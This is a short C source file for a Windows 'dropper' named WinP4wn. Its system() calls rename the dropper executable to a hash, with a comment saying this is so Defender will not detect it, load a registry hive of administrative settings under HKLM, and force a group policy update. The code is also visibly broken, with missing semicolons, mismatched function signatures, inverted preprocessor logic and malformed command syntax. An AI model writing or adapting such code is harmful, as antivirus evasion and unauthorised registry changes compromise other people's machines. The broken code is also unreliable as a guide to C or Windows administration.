#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void getos(int argc, char** argv[]) {
#ifndef __WIN32__
#define OS __WIN32__
  /** give it a hash instead of this win32 name cuz def will detect it then xDDD */
  system("ren Win32.WinP4wn.dropper.exe 27cacc006aaf5bdd2a8e6b9b94711548.exe")
  /** Using the sysreg command to import a registry hive with administrative settings xD */
  system("reg load HKLM\Software\WinP4ned 'ressources/NTUSER.DAT' /y [/c]")
#else
#error "WinP4wn does only work on Windooze!"
#endif
}

int main(int argc, char** argv[]) {
  getos();
  /** fetch latest gp changes from the local replication */
  system("gpupdate /force")
  return 0;
}
